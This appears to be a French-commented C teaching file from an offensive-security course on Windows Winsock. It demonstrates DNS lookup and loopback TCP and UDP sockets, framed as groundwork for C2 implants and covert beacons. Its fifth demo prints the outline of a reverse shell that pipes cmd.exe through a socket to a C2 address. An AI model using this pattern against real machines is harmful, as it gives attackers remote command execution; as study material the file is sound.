/*
 * OBJECTIF  : Maitriser Winsock pour la programmation reseau Windows
 * PREREQUIS : Bases du C, notions de TCP/IP
 * COMPILE   : cl example.c /Fe:example.exe /link ws2_32.lib
 *
 * Winsock est l'API reseau Windows (equivalent des sockets POSIX).
 * C'est la base pour developper des implants C2, reverse shells, et
 * toute communication reseau offensive.
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

/* Demo 1 : Initialisation Winsock et resolution DNS */
void demo_dns_resolution(void) {
    printf("[1] Resolution DNS avec Winsock\n\n");

    struct addrinfo hints = {0};
    struct addrinfo* result = NULL;

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    const char* targets[] = {"localhost", "127.0.0.1"};

    for (int i = 0; i < 2; i++) {
        int ret = getaddrinfo(targets[i], "80", &hints, &result);
        if (ret == 0 && result) {
            struct sockaddr_in* addr = (struct sockaddr_in*)result->ai_addr;
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
            printf("    %-20s -> %s\n", targets[i], ip);
            freeaddrinfo(result);
        } else {
            printf("    %-20s -> echec (err %d)\n", targets[i], ret);
        }
    }
    printf("\n");
}

/* Demo 2 : Serveur TCP simple (ecoute sur un port) */
void demo_tcp_server(USHORT port) {
    printf("[2] Serveur TCP (ecoute sur port %d)\n\n", port);

    SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server == INVALID_SOCKET) {
        printf("    [-] socket() echoue (err %d)\n", WSAGetLastError());
        return;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); /* 127.0.0.1 */
    addr.sin_port = htons(port);

    /* Permettre la reutilisation du port */
    int opt = 1;
    setsockopt(server, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));

    if (bind(server, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        printf("    [-] bind() echoue (err %d)\n", WSAGetLastError());
        closesocket(server);
        return;
    }

    listen(server, 1);
    printf("    [+] Serveur en ecoute sur 127.0.0.1:%d\n", port);

    /* Mettre le socket en non-bloquant pour la demo */
    u_long mode = 1;
    ioctlsocket(server, FIONBIO, &mode);

    printf("    [*] (mode non-bloquant pour la demo - pas d'attente)\n");
    printf("    [*] En mode reel, accept() attendrait une connexion\n\n");

    closesocket(server);
}

/* Demo 3 : Client TCP (connexion sortante) */
void demo_tcp_client(void) {
    printf("[3] Client TCP (connexion a 127.0.0.1)\n\n");

    SOCKET client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (client == INVALID_SOCKET) {
        printf("    [-] socket() echoue\n");
        return;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(80);

    printf("    [*] Tentative de connexion a 127.0.0.1:80...\n");

    /* Non-bloquant pour eviter de bloquer la demo */
    u_long mode = 1;
    ioctlsocket(client, FIONBIO, &mode);

    int ret = connect(client, (struct sockaddr*)&addr, sizeof(addr));
    if (ret == SOCKET_ERROR) {
        int err = WSAGetLastError();
        if (err == WSAEWOULDBLOCK)
            printf("    [*] Connexion en cours (non-bloquant)\n");
        else if (err == WSAECONNREFUSED)
            printf("    [-] Connexion refusee (pas de serveur sur port 80)\n");
        else
            printf("    [-] connect() echoue (err %d)\n", err);
    } else {
        printf("    [+] Connecte!\n");
    }

    closesocket(client);
    printf("\n");
}

/* Demo 4 : Communication UDP */
void demo_udp(void) {
    printf("[4] Socket UDP (datagram)\n\n");

    SOCKET udp = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udp == INVALID_SOCKET) {
        printf("    [-] socket(SOCK_DGRAM) echoue\n");
        return;
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    dest.sin_port = htons(9999);

    const char* msg = "Test UDP beacon";
    int sent = sendto(udp, msg, (int)strlen(msg), 0,
                       (struct sockaddr*)&dest, sizeof(dest));
    if (sent > 0)
        printf("    [+] Envoye %d octets UDP vers 127.0.0.1:9999\n", sent);
    else
        printf("    [-] sendto() echoue (err %d)\n", WSAGetLastError());

    printf("    [*] UDP est sans connexion : pas besoin de connect()\n");
    printf("    [*] Utilise pour DNS exfiltration, beacons furtifs\n");

    closesocket(udp);
    printf("\n");
}

/* Demo 5 : Concept reverse shell */
void demo_reverse_shell_concept(void) {
    printf("[5] Concept : Reverse Shell TCP\n\n");

    printf("    Un reverse shell en Winsock :\n\n");
    printf("    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);\n");
    printf("    connect(s, &c2_addr, sizeof(c2_addr));\n\n");
    printf("    STARTUPINFO si;\n");
    printf("    si.dwFlags = STARTF_USESTDHANDLES;\n");
    printf("    si.hStdInput  = (HANDLE)s;  // stdin  -> socket\n");
    printf("    si.hStdOutput = (HANDLE)s;  // stdout -> socket\n");
    printf("    si.hStdError  = (HANDLE)s;  // stderr -> socket\n\n");
    printf("    CreateProcess(\"cmd.exe\", ..., &si, &pi);\n\n");
    printf("    [!] Cela redirige stdin/stdout/stderr vers le socket\n");
    printf("    [!] L'attaquant obtient un shell interactif a distance\n\n");
}

int main(void) {
    printf("[*] Demo : Programmation reseau Winsock\n");
    printf("[*] ==========================================\n\n");

    /* Initialisation Winsock (obligatoire avant tout appel) */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[-] WSAStartup echoue\n");
        return 1;
    }
    printf("[+] Winsock initialise : version %d.%d\n\n",
           LOBYTE(wsa.wVersion), HIBYTE(wsa.wVersion));

    demo_dns_resolution();
    demo_tcp_server(18888);
    demo_tcp_client();
    demo_udp();
    demo_reverse_shell_concept();

    /* Nettoyage Winsock */
    WSACleanup();
    printf("[+] Exemple termine avec succes\n");
    return 0;
}
